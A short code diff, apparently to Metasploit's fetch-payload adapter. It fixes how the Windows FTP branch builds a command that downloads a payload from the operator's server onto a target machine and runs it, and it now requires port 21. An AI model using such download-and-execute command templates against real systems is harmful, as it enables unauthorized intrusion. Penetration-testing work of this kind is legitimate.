@@ -414,7 +414,13 @@ module Msf::Payload::Adapter::Fetch
       # (echo ...) | tftp pattern used on Linux.
     when 'FTP'
       if windows?
-        ftp_cmds = "(echo binary& echo get #{uri} #{_remote_destination_win}& echo quit)| ftp -A -n -i #{srvhost} #{srvport}"
+        # Windows ftp.exe does not accept a port argument — it always connects
+        # to port 21. Strip the port from the command; FETCH_SRVPORT must be 21.
+        unless srvport == 21
+          fail_with(Msf::Module::Failure::BadConfig,
+                    'Windows ftp.exe only connects to port 21. Set FETCH_SRVPORT=21.')
+        end
+        ftp_cmds = "(echo binary& echo get #{uri} #{_remote_destination_win}& echo quit)| ftp -A -n -i #{srvhost}"
         return _execute_win(ftp_cmds)
       end
       get_file_cmd = "ftp -Vo #{_remote_destination_nix} ftp://#{download_uri(uri)}"
